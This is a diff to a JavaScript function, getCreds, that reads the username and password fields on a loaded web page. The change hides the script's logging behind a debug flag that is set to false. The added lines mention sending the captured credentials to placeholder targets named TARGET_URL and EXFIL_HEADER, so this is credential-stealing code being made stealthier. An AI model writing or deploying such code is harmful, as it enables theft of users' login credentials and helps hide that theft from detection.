@@ -1,4 +1,9 @@
 function getCreds() {
+    const debug = false;
+    if (debug) {
+        console.log("[*] Looking for credentials...");
+    }
+
     // Set an interval to check repeatedly if the webpage has finished loading.
     const readyStateCheckInterval = setInterval(function() {
         // Check if the document's loading process is complete.
@@ -34,11 +39,15 @@ function getCreds() {
 
                 // Print results
                 if (password) {
-                    console.warn("--- Credential Captured ---");
-                    console.log("Username Field Found:", username || "(not found)");
-                    console.log("Password Field Found:", password);
-                    console.log("Captured from URL:", location.href);
-                    console.warn("--------------------------------------------------");
+                    if (debug) {
+                        console.log("[+] Credential Captured");
+                        console.log("[>] Username: ", username || "(not found)");
+                        console.log("[>] Password: ", password);
+                        console.log("[>] URL: ", location.href);
+                        console.log("[*] Sending credentials...");
+                        console.log("[i] Using target url: ", "TARGET_URL");
+                        console.log("[i] Using exfil header: ", "EXFIL_HEADER");
+                    }
                 }
             };
 
